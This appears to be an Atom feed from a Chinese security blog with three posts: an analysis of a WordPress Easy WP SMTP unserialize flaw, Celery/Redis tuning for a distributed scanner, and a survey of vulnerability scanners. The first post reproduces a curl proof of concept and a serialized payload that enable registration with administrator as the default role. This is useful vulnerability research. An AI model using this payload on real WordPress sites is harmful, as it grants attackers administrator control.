<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-03-21T16:46:20+08:00</updated><id>/</id><title type="html">HellSec</title><subtitle>原创网络安全博客&lt;-|-&gt;匠心独运，做有深度的良品。</subtitle><author><name>HellSec</name></author><entry><title type="html">WordPress Easy WP SMTP反序列化漏洞分析</title><link href="/bug/2019/03/21/unserialize-vuln-for-wp-plugin-easy-wp-smtp/" rel="alternate" type="text/html" title="WordPress Easy WP SMTP反序列化漏洞分析" /><published>2019-03-21T16:31:21+08:00</published><updated>2019-03-21T16:31:21+08:00</updated><id>/bug/2019/03/21/unserialize-vuln-for-wp-plugin-easy-wp-smtp</id><content type="html" xml:base="/bug/2019/03/21/unserialize-vuln-for-wp-plugin-easy-wp-smtp/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;首先，这个漏洞存在于版本v1.3.9。 我这里能下到最接近的老版本是v1.3.8，可惜v1.3.9更迭了一些重要代码，我找到的版本，应该不能复现这个漏洞。
下面我会根据网上一些细节进行分析，没耐心的大佬可以直接跳到最后看原版的分析。&lt;/p&gt;

&lt;p&gt;关键函数位置在：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wp-content/plugins/easy-wp-smtp/easy-wp-smtp.php::admin_init
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里的函数，可以在用户登入admin界面时进行hook，本来是用来查看删除日志，导入/删除/更新数据库里的配置的。&lt;/p&gt;

&lt;p&gt;然而他这里没有对用户权限做严格的验证，甚至没有认证过的游客一样可以触发这个漏洞。
/wp-admin/admin.php的注释里对admin_init解释道：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Note, this does not just run on user-facing admin screens. It runs on admin-ajax.php and admin-post.php as well.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们这里在admin-ajax.php处，为了触发漏洞，发送了action=swpsmtp_clear_log的ajax交互请求：&lt;/p&gt;

&lt;p&gt;网上给出的poc：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;网上的poc是利用函数中的一个导入配置文件的功能：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在导入以后，他会对文件内容进行一个反序列化解析：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以使用下面的array:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;序列化以后成为：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;再次组合array：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(81)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;a:2:{s:18:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;users_can_register&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:1:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:12:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;default_role&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:13:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;administrator&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;}&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;checksum&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(32)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;第二次序列化后，将下面的结果，存入我们要上传的文件/tmp/upload.txt里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:2:{s:4:&quot;data&quot;;s:81:&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;;s:8:&quot;checksum&quot;;s:32:&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;简单说下，为何要这么构造呢，因为我们的插件代码里有这么一段：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
if ( empty( $in[ 'data' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( empty( $in[ 'checksum' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {
	 echo $err_msg;
	 wp_die();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以看到，需要绕过两个部分：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unserialize( $in_raw );
unserialize( $in['data'] )
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;经过两次反序列化的结果后，data的内容，也就是下面的数组：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;才能分拆为key-value，进入后续函数：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;foreach ( $data as $key =&amp;gt; $value ) 
{
	    update_option( $key, $value );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;users_can_register是配置的注册启用选项，default_role是默认普通权限，administrator是管理权限。
到这里就明了了，开启注册后，我们注册的普通用户都是管理权限，没必要去取原来的管理密码，反正也解不出来…&lt;/p&gt;

&lt;p&gt;下面我们可以跟到更新数据库配置的位置，这就已经到主branch了：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/wp-includes/option.php::update_option
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以看到，里面的key，value的值经过下面的函数过滤，对序列化和拼接做了限制，再者使用的$wpdb进行sql执行update，可以操作的地方就比较有限了：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$value = apply_filters( &quot;pre_update_option_{$option}&quot;, $value, $old_value, $option );
$value = apply_filters( 'pre_update_option', $value, $option, $old_value );
	
if ( $value === $old_value || maybe_serialize( $value ) === maybe_serialize( $old_value ) ) 
{
	return false;
}

$result = $wpdb-&amp;gt;update( $wpdb-&amp;gt;options, $update_args, array( 'option_name' =&amp;gt; $option ) );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;附上数据库wp_options表查询的最初始的默认结果：
&lt;img src=&quot;http://ww1.sinaimg.cn/large/697f6f27ly1g1agtwdr61j210i0dujsn.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;手慢很少写分析漏洞文章，可能略显啰嗦，只是为了给小白解释的清楚些，大佬们见谅。&lt;/p&gt;

&lt;p&gt;引用文章：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/&quot;&gt;Critical zero-day vulnerability fixed in WordPress Easy WP SMTP plugin.&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="bug" /><summary type="html">Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。</summary></entry><entry><title type="html">分布式扫描填坑杂谈</title><link href="/scanner/2019/01/15/talk-about-scanner-settings/" rel="alternate" type="text/html" title="分布式扫描填坑杂谈" /><published>2019-01-15T15:49:21+08:00</published><updated>2019-01-15T15:49:21+08:00</updated><id>/scanner/2019/01/15/talk-about-scanner-settings</id><content type="html" xml:base="/scanner/2019/01/15/talk-about-scanner-settings/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;在本文中，将简单谈谈我这边采用的技术栈，有关对分布式填坑的经历，大家注意这里依旧是采用的python code。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;celery库版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以root权限启动root的问题，低版本不识别，会报错，这里使用的是celery==3.1.2x。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from celery import Celery, platforms
platforms.C_FORCE_ROOT = True

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;redis库版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;版本不合适，或者worker和server版本不对等的话，可能出现celery worker 开启不久就offline的问题，或者redis会不时的掉线重连。&lt;/p&gt;

&lt;p&gt;这里把redis库的版本，从原来的redis==3.0.x降级到redis==2.10.x，基本解决了上述bug。&lt;/p&gt;

&lt;p&gt;需要注意的是，在celery高版本的时候（比如4.x），可能会需要匹配3.x的redis库，大家看情况而定。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;重连机制&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们这里在后端存储结果，考虑到复杂sql交叉调用，还是采用的关系数据库mysql。&lt;/p&gt;

&lt;p&gt;局域网中数据库写入，需要考虑重连机制，常用的如MySQLdb库，原生无重连机制，需要自己重写。&lt;/p&gt;

&lt;p&gt;这里推荐两个模块，都支持重连：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;torndb
facebook开源的一个基于MySQLdb二次封装的一个mysql模块。
pymysql
比较常用，需要python3。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;加强存取稳定性&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果想要加强局域网数据存取的稳定性，除了把上述的超时和重连配置好以外，暂时有两个办法：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;第一：可以将存入局域网数据库服务器失败的数据，暂存本地关系数据库。采用定时调度器，或者监控网络空闲时，再进行同步
。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;第二：可以将命令或者数据直接写入本地中间件，当监控到网络空闲时间，自动同步。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;另外，笔者这方面经验比较浅，欢迎运维大佬和coding大佬多多指教下这一块儿有没有其他可优化的点。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;局域网调试&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;检测网络状态，可以看出ping其他worker是通的：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; app = Celery('test', backend='redis://random_host:6379/0', broker='redis://random_host:6379/0')
&amp;gt;&amp;gt;&amp;gt; app.control.ping(timeout=0.5)

[{'worker1.example.com': 'pong'},
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;查看时区差异:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from celery.utils.timeutils import utcoffset
&amp;gt;&amp;gt;&amp;gt; utcoffset()

0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;库版本不同步等原因，可能造成worker和server的时间不同步。而且时间不同步，似乎会导致celery的超时机制不可用。&lt;/p&gt;

&lt;p&gt;我们可以安装ntp服务，自动更新时间，同步server和worker的指定python库版本，示例命令如下【每个系统情况不一定适用】：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install ntp
service ntp start
#手动更新时间
date -R

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;监控woker状态的一些点，可以参考这篇文章：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://fangchichen.github.io/fangchichen.github.io/2018/08/08/celery%E5%87%BA%E7%8E%B0worker%E5%BC%82%E5%B8%B8offline%E6%83%85%E5%86%B5/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;celery关键配置&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还是那句话，各系统情况不同，
这里仅仅贴出几个关键点,大家觉得可以优化的地方可以讨论下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#任务预取功能，就是每个工作的进程／线程在获取任务的时候，会尽量多拿 n 个，以保证获取的通讯成本可以压缩。
CELERYD_PREFETCH_MULTIPLIER = 1

#这个表示每个工作的进程／线程 在执行 n 次任务后，主动销毁，之后会起一个新的，主要解决一些资源释放的问题。
CELERYD_MAX_TASKS_PER_CHILD = 1

#不存取返回结果，加快响应速度。
CELERY_IGNORE_RESULT=False

#该配置可以保证task不丢失，中断的task在下次启动时将会重新执行。
TASK_REJECT_ON_WORKER_LOST = True
#不会多拿任务，只有当worker完成了这个task时，任务才被标记为ack状态。
#只有当worker完成了这个task时，任务才被标记为ack状态
CELERY_ACKS_LATE = True

#解决时区同步问题
CELERY_TIMEZONE = 'Asia/Shanghai'
CELERY_ENABLE_UTC = True
USE_TZ = True

#broker的连接超时时间。
BROKER_CONNECTION_TIMEOUT = 20

#如果确认是因为当前worker的并发是prefork（多进程）,并且可能是由于死锁原因造成，4.0之后的版本不支持。
CELERYD_FORCE = True

#任务超时会分配给其他worker
BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 3600}

#禁用所有速度限制，如果网络资源有限，不建议开足马力。
#CELERY_DISABLE_RATE_LIMITS = True
#CELERY_ACKS_LATE = True
#CELERY_IGNORE_RESULT = True

#这个表示保存任务结果的时长，这个时间会被设置到 backend 里面
#CELERY_TASK_RESULT_EXPIRES = 3600

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;celery命令行参数&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Queue还是建议启用的，方便清空，也方便指定queuename运行特定任务。
比如配置文件里这么写:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CELERY_QUEUES = (
            Queue('default', Exchange('default'), routing_key='default'),
            Queue('wakaka', Exchange('wakaka'), routing_key='wakaka'),
            )
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;那么，命令行可以这么输入：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;celery -A test worker -E -l INFO -n workername -Q wakaka --concurrency=4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;注意，–concurrency的值是并发进程数，这是由你的CPU个数决定性能的，不要设太高。&lt;/p&gt;

&lt;p&gt;win下的话，在高版本celery 4.x，默认的是prefork，报错解决方法如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip install eventlet
celery -A proj worker -l info -P eventlet

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;最后，建议大家不要在win下运行celery，似乎4.x以后某个版本已经放弃支持，而且win下有很多坑没法填。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;任务调度框架&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于任务调度这一块儿，除了celery，感觉dramatiq和rq的坑会少些，以后会抽空来谈谈。&lt;/p&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;以上配置和分析内容，是摸索和查资料得来的，感谢前辈们的开源共享。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。</summary></entry><entry><title type="html">漫谈漏洞扫描</title><link href="/scanner/2018/12/27/talk-about-scanner-roads/" rel="alternate" type="text/html" title="漫谈漏洞扫描" /><published>2018-12-27T16:42:38+08:00</published><updated>2018-12-27T16:42:38+08:00</updated><id>/scanner/2018/12/27/talk-about-scanner-roads</id><content type="html" xml:base="/scanner/2018/12/27/talk-about-scanner-roads/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;企业级漏扫&quot;&gt;企业级漏扫&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;盒子扫描器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于漏扫产品的话，部分甲方单位会按公安那边的标准，在内网部署一些盒子扫描器（硬件服务器+扫描软件）。&lt;/p&gt;

&lt;p&gt;说实话，这玩意儿定位是比较尴尬的，虽然大的单位每年有一定的采购指标。但是有时候还是会听产品经理吐槽，每次实在卖不出量，可能一单安全服务生意卖出个一两台就不错了。&lt;/p&gt;

&lt;p&gt;当然，现在漏扫一般会配合漏洞管理、网站监控等产品一起卖。为了覆（tong）盖（hang）产（jing）品（zheng）线，给售前和销售操控的空间，这款产品还是必须要的。&lt;/p&gt;

&lt;p&gt;卖漏扫盒子的利润还算可观，只要销售和渠道给力，传统乙方还是愿意做的这门生意的。&lt;/p&gt;

&lt;p&gt;代表厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sangfor
venus
nsfocus
topsec
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;在线漏扫服务&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在线漏扫的话，一般难以对内网进行检测。大多数的操作是，在验证外网某站的所有权后，再签协议授权扫描。不过由于成本较盒子更加低廉，容易受到中小厂商的追捧。&lt;/p&gt;

&lt;p&gt;当然，如果内网也需要享受这样的服务的话，自然还是需要安服人员带着盒子，或者类似封装好的扫描器，在企业单位进行驻场检测。&lt;/p&gt;

&lt;p&gt;代表厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;360
knownsec
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;定制漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;据笔者所知，部分云服务厂商，会对云服务客户提供了定制漏扫服务。&lt;/p&gt;

&lt;p&gt;由于是自家的服务器，自然对客户的业务具有一定的了解。无论是做漏扫，还是做资产监控还是态势感知，都是相对容易的。&lt;/p&gt;

&lt;p&gt;云服务厂商在对这部分客户做漏扫时，由于统一的架构部署，安服漏扫会比较精确和有效。貌似这样的漏扫服务，一般不会对外开放，算是定制的服务。&lt;/p&gt;

&lt;p&gt;顺便提一句，部分漏洞平台，好像对于大客户也推出了一条龙服务，其中是包括定制漏扫的。&lt;/p&gt;

&lt;p&gt;代表云厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alibaba
tencent
kingsoft
riskivy
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;免费商业漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;市面上也出现了部分优秀的商业级别漏扫，咱们这里先别讨论是免费版还是破解版。&lt;/p&gt;

&lt;p&gt;正是有了这些漏扫产品，在驻场和分公司的苦逼兼职的安服人员，才有了一口饭吃【纯吐槽公司制度】。&lt;/p&gt;

&lt;p&gt;这里解释下，因为公司内部的漏扫产品，不是分驻地都能拿到授权的，那最后怎么办呢？用破解的。效果不好咋办？换其他家的破解或者免费产品。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AWVS
nessus
arachni
metasploit
sqlmap
burpsuite
appscan
netsparker
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;开源漏扫&quot;&gt;开源漏扫&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;社区级漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些产品一般是社区或者团队在维护的，一般为乙方渗透人员或者Bug Bounty人员所用。&lt;/p&gt;

&lt;p&gt;一旦他们需要对企业机构，或者政府单位进行渗透测试时，可以根据情况，部署分布式节点扫描，加快漏扫速度。&lt;/p&gt;

&lt;p&gt;笔者依稀记得曾经的bugscan，好像大家都可以接入公网节点。这听起来，其实有点像以前的迅雷p2p，可以加速所有运行的任务。&lt;/p&gt;

&lt;p&gt;不过后来好像由于各种原因，部分人搞到了源码和payload包，自己玩起了单机。多台外网VPS一部署，扫起东西来也是美滋滋，亲测出结果还是比较快的。&lt;/p&gt;

&lt;p&gt;不过这种漏扫有个坏处就是，一旦社区不用心再维护，渐渐就没有人再提交payload，毕竟单个漏洞的生命周期还是不长的。&lt;/p&gt;

&lt;p&gt;当然，这种产品还有个去路，就是实现企业化。&lt;/p&gt;

&lt;p&gt;一旦变成企业级产品，就会有更多的资源投入去维护它，自然能更好的发展下去。&lt;/p&gt;

&lt;p&gt;比较可惜的是，升级后的版本以及payload，自然大多数就不会再开源了。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bugscan
蚁逅
tangscan
Beebeeto
Pocscan
Osprey「鱼鹰」
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;综合扫描&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由于各种脚本语言的兴起，大幅减少了coding的难度和时间，网络上涌现出一批由团队或个人维护的综合扫描器。&lt;/p&gt;

&lt;p&gt;虽然得吐槽下，大多数质量良莠不齐，造轮子的比较多，而且后续长期作者维护的比较少，不过其中不乏优秀的个体。&lt;/p&gt;

&lt;p&gt;综合扫描定义比较模糊，一般除了exp检测和CMS识别外，还有部分项目加入了路径爆破、资产统计、端口扫描等功能。&lt;/p&gt;

&lt;p&gt;不过让人稍稍有点失望的是，这类综合扫描可能大同小异，暂时没有发现特别亮眼的点。&lt;/p&gt;

&lt;p&gt;在笔者过往的系列文章中，也谈过部分关于综合扫描器细节，这里不再细说。&lt;/p&gt;

&lt;p&gt;代表产品有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;w9scan
AngelSword
fenghuangscanner
猪猪侠PPT中提过的扫描器
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

